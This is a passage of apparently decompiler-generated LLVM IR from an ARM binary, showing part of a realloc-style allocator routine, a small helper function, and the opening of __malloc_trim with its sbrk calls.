  store i32 %v1_130a4, i32* %r3.global-to-local, align 4
  %v2_130a8 = add i32 %v1_130a4, %v1_13020
  store i32 %v2_130a8, i32* %r0.global-to-local, align 4
  %v3_130ac = icmp ult i32 %v2_130a8, %v1_13028
  br i1 %v3_130ac, label %dec_label_pc_130e4, label %dec_label_pc_130b4

dec_label_pc_130b4:                               ; preds = %dec_label_pc_130a4
  %v1_130b4 = add i32 %v1_13020, %v0_13008
  %v2_130b4 = inttoptr i32 %v1_130b4 to i32*
  %v3_130b4 = load i32, i32* %v2_130b4, align 4
  store i32 %v3_130b4, i32* %r1.global-to-local, align 4
  %v1_130b8 = add i32 %v3_130b4, 12
  %v2_130b8 = inttoptr i32 %v1_130b8 to i32*
  %v3_130b8 = load i32, i32* %v2_130b8, align 4
  store i32 %v3_130b8, i32* %r3.global-to-local, align 4
  %v9_130bc = icmp eq i32 %v3_130b8, %v2_13044
  %v1_130c0 = add i32 %v2_13044, 12
  %v2_130c0 = inttoptr i32 %v1_130c0 to i32*
  %v3_130c0 = load i32, i32* %v2_130c0, align 4
  store i32 %v3_130c0, i32* %r2.global-to-local, align 4
  br i1 %v9_130bc, label %dec_label_pc_130c8, label %dec_label_pc_130d4

dec_label_pc_130c8:                               ; preds = %dec_label_pc_130b4
  %v1_130c8 = add i32 %v3_130c0, 8
  %v2_130c8 = inttoptr i32 %v1_130c8 to i32*
  %v3_130c8 = load i32, i32* %v2_130c8, align 4
  store i32 %v3_130c8, i32* %r3.global-to-local, align 4
  %v9_130cc = icmp eq i32 %v3_130c8, %v2_13044
  br i1 %v9_130cc, label %dec_label_pc_130d8, label %dec_label_pc_130d4

dec_label_pc_130d4:                               ; preds = %dec_label_pc_130b4, %dec_label_pc_130c8
  %v0_130d4 = call i32 @abort()
  store i32 %v0_130d4, i32* %r0.global-to-local, align 4
  %v0_130d8.pre = load i32, i32* @r1, align 4
  %v1_130d8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_130d8

dec_label_pc_130d8:                               ; preds = %dec_label_pc_130c8, %dec_label_pc_130d4
  %v1_130d8 = phi i32 [ %v3_130c0, %dec_label_pc_130c8 ], [ %v1_130d8.pre, %dec_label_pc_130d4 ]
  %v0_130d8 = phi i32 [ %v3_130b4, %dec_label_pc_130c8 ], [ %v0_130d8.pre, %dec_label_pc_130d4 ]
  %v2_130d8 = add i32 %v1_130d8, 8
  %v3_130d8 = inttoptr i32 %v2_130d8 to i32*
  store i32 %v0_130d8, i32* %v3_130d8, align 4
  %v0_130dc = load i32, i32* %r2.global-to-local, align 4
  %v1_130dc = load i32, i32* %r1.global-to-local, align 4
  %v2_130dc = add i32 %v1_130dc, 12
  %v3_130dc = inttoptr i32 %v2_130dc to i32*
  store i32 %v0_130dc, i32* %v3_130dc, align 4
  %v1_13198.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13198

dec_label_pc_130e4:                               ; preds = %dec_label_pc_13054, %dec_label_pc_130a4, %dec_label_pc_13090
  %v1_130e4 = add i32 %v1_13028, -7
  store i32 %v1_130e4, i32* @r0, align 4
  %v0_130e8 = call i32 @malloc()
  store i32 %v0_130e8, i32* @r0, align 4
  store i32 %v0_130e8, i32* %r1.global-to-local, align 4
  %v2_130ec = icmp eq i32 %v0_130e8, 0
  br i1 %v2_130ec, label %bb31, label %dec_label_pc_130f8

bb31:                                             ; preds = %dec_label_pc_130e4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_132cc

dec_label_pc_130f8:                               ; preds = %dec_label_pc_130e4
  %v1_13100.pre = load i32, i32* @r4, align 4
  %v1_130f8 = add i32 %v0_130e8, -4
  %v2_130f8 = inttoptr i32 %v1_130f8 to i32*
  %v3_130f8 = load i32, i32* %v2_130f8, align 4
  store i32 %v3_130f8, i32* @r3, align 4
  %v1_130fc = add i32 %v0_130e8, -8
  store i32 %v1_130fc, i32* @r7, align 4
  %v9_13100 = icmp eq i32 %v1_130fc, %v1_13100.pre
  br i1 %v9_13100, label %.thread2, label %dec_label_pc_13110

.thread2:                                         ; preds = %dec_label_pc_130f8
  %v2_13104 = and i32 %v3_130f8, -4
  store i32 %v2_13104, i32* %r3.global-to-local, align 4
  %v2_13108 = load i32, i32* @r6, align 4
  %v3_13108 = add i32 %v2_13108, %v2_13104
  store i32 %v3_13108, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13198

dec_label_pc_13110:                               ; preds = %dec_label_pc_130f8
  %v0_13110 = load i32, i32* @r6, align 4
  %v1_13110 = add i32 %v0_13110, -4
  store i32 %v1_13110, i32* @r2, align 4
  %v3_13114 = udiv i32 %v1_13110, 4
  store i32 %v3_13114, i32* @ip, align 4
  %tmp37 = and i32 %v1_13110, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1311c = icmp ult i32 %v1_13110, 36
  %v3_1311c = or i1 %tmp38, %v2_1311c
  %v0_1312c = load i32, i32* @r5, align 4
  br i1 %v3_1311c, label %dec_label_pc_1312c, label %dec_label_pc_13120

dec_label_pc_13120:                               ; preds = %dec_label_pc_13110
  store i32 %v0_1312c, i32* @r1, align 4
  %v0_13124 = call i32 @memcpy()
  store i32 %v0_13124, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1312c:                               ; preds = %dec_label_pc_13110
  %v1_1312c = inttoptr i32 %v0_1312c to i32*
  %v2_1312c = load i32, i32* %v1_1312c, align 4
  store i32 %v2_1312c, i32* %r3.global-to-local, align 4
  %v2_13130 = inttoptr i32 %v0_130e8 to i32*
  store i32 %v2_1312c, i32* %v2_13130, align 4
  %v0_13134 = load i32, i32* @r5, align 4
  %v1_13134 = add i32 %v0_13134, 4
  %v2_13134 = inttoptr i32 %v1_13134 to i32*
  %v3_13134 = load i32, i32* %v2_13134, align 4
  store i32 %v3_13134, i32* %r3.global-to-local, align 4
  %v1_13138 = load i32, i32* %r1.global-to-local, align 4
  %v2_13138 = add i32 %v1_13138, 4
  %v3_13138 = inttoptr i32 %v2_13138 to i32*
  store i32 %v3_13134, i32* %v3_13138, align 4
  %v0_1313c = load i32, i32* @r5, align 4
  %v1_1313c = add i32 %v0_1313c, 8
  %v2_1313c = inttoptr i32 %v1_1313c to i32*
  %v3_1313c = load i32, i32* %v2_1313c, align 4
  store i32 %v3_1313c, i32* %r3.global-to-local, align 4
  %v0_13140 = load i32, i32* @ip, align 4
  %v1_13144 = load i32, i32* %r1.global-to-local, align 4
  %v2_13144 = add i32 %v1_13144, 8
  %v3_13144 = inttoptr i32 %v2_13144 to i32*
  store i32 %v3_1313c, i32* %v3_13144, align 4
  %tmp39 = icmp ult i32 %v0_13140, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1314c

dec_label_pc_1314c:                               ; preds = %dec_label_pc_1312c
  %v0_1314c = load i32, i32* @r5, align 4
  %v1_1314c = add i32 %v0_1314c, 12
  %v2_1314c = inttoptr i32 %v1_1314c to i32*
  %v3_1314c = load i32, i32* %v2_1314c, align 4
  store i32 %v3_1314c, i32* %r3.global-to-local, align 4
  %v1_13150 = load i32, i32* %r1.global-to-local, align 4
  %v2_13150 = add i32 %v1_13150, 12
  %v3_13150 = inttoptr i32 %v2_13150 to i32*
  store i32 %v3_1314c, i32* %v3_13150, align 4
  %v0_13154 = load i32, i32* @r5, align 4
  %v1_13154 = add i32 %v0_13154, 16
  %v2_13154 = inttoptr i32 %v1_13154 to i32*
  %v3_13154 = load i32, i32* %v2_13154, align 4
  store i32 %v3_13154, i32* %r3.global-to-local, align 4
  %v0_13158 = load i32, i32* @ip, align 4
  %v1_1315c = load i32, i32* %r1.global-to-local, align 4
  %v2_1315c = add i32 %v1_1315c, 16
  %v3_1315c = inttoptr i32 %v2_1315c to i32*
  store i32 %v3_13154, i32* %v3_1315c, align 4
  %tmp40 = icmp ult i32 %v0_13158, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_13164

dec_label_pc_13164:                               ; preds = %dec_label_pc_1314c
  %v0_13164 = load i32, i32* @r5, align 4
  %v1_13164 = add i32 %v0_13164, 20
  %v2_13164 = inttoptr i32 %v1_13164 to i32*
  %v3_13164 = load i32, i32* %v2_13164, align 4
  store i32 %v3_13164, i32* %r3.global-to-local, align 4
  %v1_13168 = load i32, i32* %r1.global-to-local, align 4
  %v2_13168 = add i32 %v1_13168, 20
  %v3_13168 = inttoptr i32 %v2_13168 to i32*
  store i32 %v3_13164, i32* %v3_13168, align 4
  %v0_1316c = load i32, i32* @r5, align 4
  %v1_1316c = add i32 %v0_1316c, 24
  %v2_1316c = inttoptr i32 %v1_1316c to i32*
  %v3_1316c = load i32, i32* %v2_1316c, align 4
  store i32 %v3_1316c, i32* %r3.global-to-local, align 4
  %v1_13170 = load i32, i32* %r1.global-to-local, align 4
  %v2_13170 = add i32 %v1_13170, 24
  %v3_13170 = inttoptr i32 %v2_13170 to i32*
  store i32 %v3_1316c, i32* %v3_13170, align 4
  %v0_13174 = load i32, i32* @ip, align 4
  %v7_13174 = icmp eq i32 %v0_13174, 9
  br i1 %v7_13174, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_13164
  %v1_13178 = load i32, i32* @r5, align 4
  %v2_13178 = add i32 %v1_13178, 28
  %v3_13178 = inttoptr i32 %v2_13178 to i32*
  %v4_13178 = load i32, i32* %v3_13178, align 4
  store i32 %v4_13178, i32* %r3.global-to-local, align 4
  %v2_1317c = load i32, i32* %r1.global-to-local, align 4
  %v3_1317c = add i32 %v2_1317c, 28
  %v4_1317c = inttoptr i32 %v3_1317c to i32*
  store i32 %v4_13178, i32* %v4_1317c, align 4
  %v1_13180 = load i32, i32* @r5, align 4
  %v2_13180 = add i32 %v1_13180, 32
  %v3_13180 = inttoptr i32 %v2_13180 to i32*
  %v4_13180 = load i32, i32* %v3_13180, align 4
  store i32 %v4_13180, i32* %r3.global-to-local, align 4
  %v2_13184 = load i32, i32* %r1.global-to-local, align 4
  %v3_13184 = add i32 %v2_13184, 32
  %v4_13184 = inttoptr i32 %v3_13184 to i32*
  store i32 %v4_13180, i32* %v4_13184, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13164, %dec_label_pc_1314c, %dec_label_pc_1312c, %dec_label_pc_13120, %bb32
  %v0_13188 = load i32, i32* @r5, align 4
  store i32 %v0_13188, i32* @r0, align 4
  %v0_1318c = call i32 @free()
  store i32 %v0_1318c, i32* %r0.global-to-local, align 4
  %v0_13190 = load i32, i32* @r7, align 4
  %v1_13190 = add i32 %v0_13190, 8
  store i32 %v1_13190, i32* @r4, align 4
  br label %dec_label_pc_132cc

dec_label_pc_13198:                               ; preds = %bb30, %.thread2, %dec_label_pc_130d8
  %v0_131ac = phi i32 [ %v3_13108, %.thread2 ], [ %v1_13020, %bb30 ], [ %v1_13198.pre, %dec_label_pc_130d8 ]
  %v0_13198 = load i32, i32* @sb, align 4
  %v2_13198 = sub i32 %v0_131ac, %v0_13198
  store i32 %v2_13198, i32* %r1.global-to-local, align 4
  %v0_131a0 = load i32, i32* @sl, align 4
  %v1_131a0 = add i32 %v0_131a0, 4
  %v2_131a0 = inttoptr i32 %v1_131a0 to i32*
  %v3_131a0 = load i32, i32* %v2_131a0, align 4
  %tmp41 = icmp ugt i32 %v2_13198, 15
  %v1_131c8 = urem i32 %v3_131a0, 2
  store i32 %v1_131c8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_131c8, label %dec_label_pc_131a8

dec_label_pc_131a8:                               ; preds = %dec_label_pc_13198
  %v2_131ac = or i32 %v1_131c8, %v0_131ac
  store i32 %v2_131ac, i32* %r3.global-to-local, align 4
  store i32 %v2_131ac, i32* %v2_131a0, align 4
  %v0_131b4 = load i32, i32* @sl, align 4
  %v1_131b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_131b4 = add i32 %v1_131b4, %v0_131b4
  store i32 %v2_131b4, i32* %r2.global-to-local, align 4
  %v1_131b8 = add i32 %v2_131b4, 4
  %v2_131b8 = inttoptr i32 %v1_131b8 to i32*
  %v3_131b8 = load i32, i32* %v2_131b8, align 4
  %v1_131bc = or i32 %v3_131b8, 1
  store i32 %v1_131bc, i32* %r3.global-to-local, align 4
  store i32 %v1_131bc, i32* %v2_131b8, align 4
  br label %dec_label_pc_131f8

dec_label_pc_131c8:                               ; preds = %dec_label_pc_13198
  %v2_131cc = add i32 %v0_131a0, %v0_13198
  store i32 %v2_131cc, i32* %r0.global-to-local, align 4
  %v2_131d0 = or i32 %v1_131c8, %v0_13198
  store i32 %v2_131d0, i32* %r3.global-to-local, align 4
  %v1_131d4 = or i32 %v2_13198, 1
  store i32 %v1_131d4, i32* %r2.global-to-local, align 4
  store i32 %v2_131d0, i32* %v2_131a0, align 4
  %v0_131dc = load i32, i32* %r2.global-to-local, align 4
  %v1_131dc = load i32, i32* %r0.global-to-local, align 4
  %v2_131dc = add i32 %v1_131dc, 4
  %v3_131dc = inttoptr i32 %v2_131dc to i32*
  store i32 %v0_131dc, i32* %v3_131dc, align 4
  %v0_131e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_131e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_131e0 = add i32 %v1_131e0, %v0_131e0
  store i32 %v2_131e0, i32* %r2.global-to-local, align 4
  %v1_131e4 = add i32 %v2_131e0, 4
  %v2_131e4 = inttoptr i32 %v1_131e4 to i32*
  %v3_131e4 = load i32, i32* %v2_131e4, align 4
  %v1_131e8 = or i32 %v3_131e4, 1
  store i32 %v1_131e8, i32* %r3.global-to-local, align 4
  store i32 %v1_131e8, i32* %v2_131e4, align 4
  %v0_131f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_131f0 = add i32 %v0_131f0, 8
  store i32 %v1_131f0, i32* @r0, align 4
  %v0_131f4 = call i32 @free()
  store i32 %v0_131f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131f8

dec_label_pc_131f8:                               ; preds = %dec_label_pc_131a8, %dec_label_pc_131c8
  %v0_131f8 = load i32, i32* @sl, align 4
  %v1_131f8 = add i32 %v0_131f8, 8
  store i32 %v1_131f8, i32* @r4, align 4
  br label %dec_label_pc_132cc

dec_label_pc_13200:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r1.global-to-local, align 4
  %v4_13208 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_13208, i32* @r8, align 4
  %v2_1320c = inttoptr i32 %v1_1301c to i32*
  %v3_1320c = load i32, i32* %v2_1320c, align 4
  store i32 %v3_1320c, i32* @r4, align 4
  %v1_13210 = add i32 %v4_13208, 860
  %v2_13210 = inttoptr i32 %v1_13210 to i32*
  %v3_13210 = load i32, i32* %v2_13210, align 4
  %v1_13214 = add i32 %v3_1320c, 4
  %v1_13218 = add i32 %v3_13210, -1
  store i32 %v1_13218, i32* %r2.global-to-local, align 4
  %v2_1321c = add i32 %v1_13214, %v1_13218
  %v1_13220 = load i32, i32* @sb, align 4
  %v2_13220 = add i32 %v2_1321c, %v1_13220
  store i32 %v2_13220, i32* %r3.global-to-local, align 4
  %v2_13224 = sub i32 0, %v3_13210
  %v3_13224 = and i32 %v2_13220, %v2_13224
  store i32 %v3_13224, i32* @r7, align 4
  %v2_13228 = sub i32 %v3_13224, %v3_1320c
  store i32 %v2_13228, i32* @fp, align 4
  %v9_1322c = icmp eq i32 %v1_13020, %v2_13228
  br i1 %v9_1322c, label %dec_label_pc_132a0, label %dec_label_pc_13234

dec_label_pc_13234:                               ; preds = %dec_label_pc_13200
  %v2_13234 = sub i32 %v1_1301c, %v3_1320c
  store i32 %v2_13234, i32* %r0.global-to-local, align 4
  %v2_13238 = add i32 %v3_1320c, %v1_13020
  store i32 %v2_13238, i32* %r1.global-to-local, align 4
  store i32 %v3_13224, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_13244 = call i32 @mremap(i32 %v2_13234, i32 %v2_13238, i32 %v3_13224, i32 1)
  store i32 %v4_13244, i32* %r0.global-to-local, align 4
  %v7_13248 = icmp eq i32 %v4_13244, -1
  br i1 %v7_13248, label %dec_label_pc_13294, label %dec_label_pc_13250

dec_label_pc_13250:                               ; preds = %dec_label_pc_13234
  %v1_13250 = load i32, i32* @r4, align 4
  %v2_13250 = add i32 %v1_13250, %v4_13244
  store i32 %v2_13250, i32* %r0.global-to-local, align 4
  %v0_13254 = load i32, i32* @fp, align 4
  %v1_13254 = or i32 %v0_13254, 2
  store i32 %v1_13254, i32* %r3.global-to-local, align 4
  %v2_13258 = add i32 %v2_13250, 4
  %v3_13258 = inttoptr i32 %v2_13258 to i32*
  store i32 %v1_13254, i32* %v3_13258, align 4
  %v0_1325c = load i32, i32* @r8, align 4
  %v1_1325c = add i32 %v0_1325c, 868
  %v2_1325c = inttoptr i32 %v1_1325c to i32*
  %v3_1325c = load i32, i32* %v2_1325c, align 4
  store i32 %v3_1325c, i32* %r3.global-to-local, align 4
  %v1_13260 = add i32 %v0_1325c, 880
  %v2_13260 = inttoptr i32 %v1_13260 to i32*
  %v3_13260 = load i32, i32* %v2_13260, align 4
  store i32 %v3_13260, i32* %r2.global-to-local, align 4
  %v0_13264 = load i32, i32* @r6, align 4
  %v2_13264 = sub i32 %v3_1325c, %v0_13264
  store i32 %v2_13264, i32* %r3.global-to-local, align 4
  %v1_13268 = load i32, i32* @r7, align 4
  %v2_13268 = add i32 %v1_13268, %v2_13264
  store i32 %v2_13268, i32* %r1.global-to-local, align 4
  %v1_1326c = add i32 %v0_1325c, 872
  %v2_1326c = inttoptr i32 %v1_1326c to i32*
  %v3_1326c = load i32, i32* %v2_1326c, align 4
  store i32 %v3_1326c, i32* %r3.global-to-local, align 4
  %v1_13274 = add i32 %v0_1325c, 884
  %v2_13274 = inttoptr i32 %v1_13274 to i32*
  %v3_13274 = load i32, i32* %v2_13274, align 4
  store i32 %v3_13274, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_13268, %v3_13260
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_13250
  store i32 %v2_13268, i32* %v2_13260, align 4
  %v0_1327c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1327c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_13250, %bb33
  %v1_1327c = phi i32 [ %v0_1325c, %dec_label_pc_13250 ], [ %v1_1327c.pre, %bb33 ]
  %v0_1327c = phi i32 [ %v2_13268, %dec_label_pc_13250 ], [ %v0_1327c.pre, %bb33 ]
  %v2_1327c = add i32 %v1_1327c, 868
  %v3_1327c = inttoptr i32 %v2_1327c to i32*
  store i32 %v0_1327c, i32* %v3_1327c, align 4
  %v0_13280 = load i32, i32* %r1.global-to-local, align 4
  %v1_13280 = load i32, i32* %r3.global-to-local, align 4
  %v2_13280 = add i32 %v1_13280, %v0_13280
  store i32 %v2_13280, i32* %r1.global-to-local, align 4
  %v1_13284 = load i32, i32* %r2.global-to-local, align 4
  %v0_13288 = load i32, i32* %r0.global-to-local, align 4
  %v1_13288 = add i32 %v0_13288, 8
  store i32 %v1_13288, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_13280, %v1_13284
  br i1 %tmp43, label %bb35, label %dec_label_pc_132cc

bb35:                                             ; preds = %bb34
  %v5_1328c = load i32, i32* @r8, align 4
  %v6_1328c = add i32 %v5_1328c, 884
  %v7_1328c = inttoptr i32 %v6_1328c to i32*
  store i32 %v2_13280, i32* %v7_1328c, align 4
  br label %dec_label_pc_132cc

dec_label_pc_13294:                               ; preds = %dec_label_pc_13234
  %v0_13294 = load i32, i32* @sb, align 4
  %v1_13294 = add i32 %v0_13294, 4
  store i32 %v1_13294, i32* %r3.global-to-local, align 4
  %v0_13298 = load i32, i32* @r6, align 4
  %v3_13298 = icmp ult i32 %v0_13298, %v1_13294
  br i1 %v3_13298, label %dec_label_pc_132a8, label %dec_label_pc_13294.dec_label_pc_132a0_crit_edge

dec_label_pc_13294.dec_label_pc_132a0_crit_edge:  ; preds = %dec_label_pc_13294
  %v0_132a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_132a0

dec_label_pc_132a0:                               ; preds = %dec_label_pc_13294.dec_label_pc_132a0_crit_edge, %dec_label_pc_13200
  %v0_132a0 = phi i32 [ %v0_132a0.pre, %dec_label_pc_13294.dec_label_pc_132a0_crit_edge ], [ %v0_13008, %dec_label_pc_13200 ]
  store i32 %v0_132a0, i32* @r4, align 4
  br label %dec_label_pc_132cc

dec_label_pc_132a8:                               ; preds = %dec_label_pc_13294
  %v1_132a8 = add i32 %v0_13294, -7
  store i32 %v1_132a8, i32* @r0, align 4
  %v0_132ac = call i32 @malloc()
  store i32 %v0_132ac, i32* @r0, align 4
  store i32 %v0_132ac, i32* @r4, align 4
  %v2_132b0 = icmp eq i32 %v0_132ac, 0
  br i1 %v2_132b0, label %dec_label_pc_132cc, label %dec_label_pc_132b8

dec_label_pc_132b8:                               ; preds = %dec_label_pc_132a8
  %v0_132b8 = load i32, i32* @r6, align 4
  %v1_132b8 = add i32 %v0_132b8, -8
  store i32 %v1_132b8, i32* @r2, align 4
  %v0_132bc = load i32, i32* @r5, align 4
  store i32 %v0_132bc, i32* @r1, align 4
  %v0_132c0 = call i32 @memcpy()
  %v0_132c4 = load i32, i32* @r5, align 4
  store i32 %v0_132c4, i32* @r0, align 4
  %v0_132c8 = call i32 @free()
  store i32 %v0_132c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_132cc

dec_label_pc_132cc:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_132a8, %dec_label_pc_132a0, %dec_label_pc_131f8, %.thread6, %dec_label_pc_13068, %dec_label_pc_132b8
  store i32 %v2_12fb4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v4_132dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_132dc)
  br label %dec_label_pc_132e8

dec_label_pc_132e8:                               ; preds = %dec_label_pc_12fe8, %dec_label_pc_12f90, %dec_label_pc_12f78, %dec_label_pc_132cc
  %v0_132e8 = load i32, i32* @r4, align 4
  store i32 %v0_132e8, i32* %r0.global-to-local, align 4
  store i32 %v3_12f58, i32* @r4, align 4
  store i32 %v6_12f58, i32* @r5, align 4
  store i32 %v9_12f58, i32* @r6, align 4
  store i32 %v12_12f58, i32* @r7, align 4
  store i32 %v15_12f58, i32* @r8, align 4
  store i32 %v18_12f58, i32* @sb, align 4
  store i32 %v21_12f58, i32* @sl, align 4
  store i32 %v24_12f58, i32* @fp, align 4
  store i32 %v27_12f58, i32* @lr, align 4
  ret i32 %v0_132e8

; uselistorder directives
  uselistorder i32 %v2_13280, { 1, 0, 2 }
  uselistorder i32 %v2_13268, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13244, { 1, 0, 2 }
  uselistorder i32 %v3_13224, { 1, 0, 2, 3 }
  uselistorder i32 %v1_131c8, { 2, 1, 0 }
  uselistorder i32 %v2_13198, { 1, 0, 2 }
  uselistorder i32 %v0_1312c, { 1, 0 }
  uselistorder i32 %v0_130e8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1304c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13044, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_13028, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13020, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1301c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1300c, { 1, 0 }
  uselistorder i32 %v0_13008, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12fe0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_132e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_132cc, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_131f8, { 1, 0 }
  uselistorder label %dec_label_pc_13198, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_130e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_130d8, { 1, 0 }
  uselistorder label %dec_label_pc_130d4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_132fc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_132fc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_132fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_132fc, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_132fc
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_13310.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13310.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_13314.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_132fc, %bb
  %v4_13314 = phi i32 [ %v4_13314.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_132fc ], [ 0, %bb ]
  ret i32 %v4_13314

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_13318 = add i32 %arg2, 44
  %v2_13318 = inttoptr i32 %v1_13318 to i32*
  %v3_13318 = load i32, i32* %v2_13318, align 4
  %v12_1331c = load i32, i32* @r7, align 4
  %v1_13320 = add i32 %v3_13318, 4
  %v2_13320 = inttoptr i32 %v1_13320 to i32*
  %v3_13320 = load i32, i32* %v2_13320, align 4
  %v1_13324 = add i32 %arg2, 860
  %v2_13324 = inttoptr i32 %v1_13324 to i32*
  %v3_13324 = load i32, i32* %v2_13324, align 4
  store i32 %v3_13324, i32* @r4, align 4
  %v1_13328 = and i32 %v3_13320, -4
  store i32 %v1_13328, i32* @r6, align 4
  %v1_1332c = add i32 %v1_13328, -17
  %v2_13330 = add i32 %v1_1332c, %v3_13324
  store i32 %arg2, i32* @r5, align 4
  %v2_1333c = sub i32 %v2_13330, %arg1
  store i32 %v3_13324, i32* %r1.global-to-local, align 4
  %v2_13344 = udiv i32 %v2_1333c, %v3_13324
  %v1_13348 = add i32 %v2_13344, -1
  store i32 %v1_13348, i32* %r0.global-to-local, align 4
  %v2_1334c = mul i32 %v1_13348, %v3_13324
  store i32 %v2_1334c, i32* @r7, align 4
  %v2_13350 = icmp eq i32 %v2_1334c, 0
  store i1 %v2_13350, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_1334c, 1
  br i1 %tmp8, label %dec_label_pc_133b8, label %dec_label_pc_13358

dec_label_pc_13358:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1335c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1335c, i32* %r0.global-to-local, align 4
  %v0_13360 = load i32, i32* @r5, align 4
  %v1_13360 = add i32 %v0_13360, 44
  %v2_13360 = inttoptr i32 %v1_13360 to i32*
  %v3_13360 = load i32, i32* %v2_13360, align 4
  %v0_13364 = load i32, i32* @r6, align 4
  %v2_13364 = add i32 %v0_13364, %v3_13360
  %v9_13368 = icmp eq i32 %v1_1335c, %v2_13364
  store i1 %v9_13368, i1* @cpsr_z, align 1
  store i32 %v1_1335c, i32* @r4, align 4
  br i1 %v9_13368, label %dec_label_pc_13374, label %dec_label_pc_133b8

dec_label_pc_13374:                               ; preds = %dec_label_pc_13358
  %v0_13374 = load i32, i32* @r7, align 4
  %v1_13374 = sub i32 0, %v0_13374
  store i32 %v1_13374, i32* %r0.global-to-local, align 4
  %v1_13378 = call i32 @__GI_sbrk(i32 %v1_13374)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13380 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13380, i32* %r0.global-to-local, align 4
  %v7_13384 = icmp eq i32 %v1_13380, -1
  store i1 %v7_13384, i1* @cpsr_z, align 1
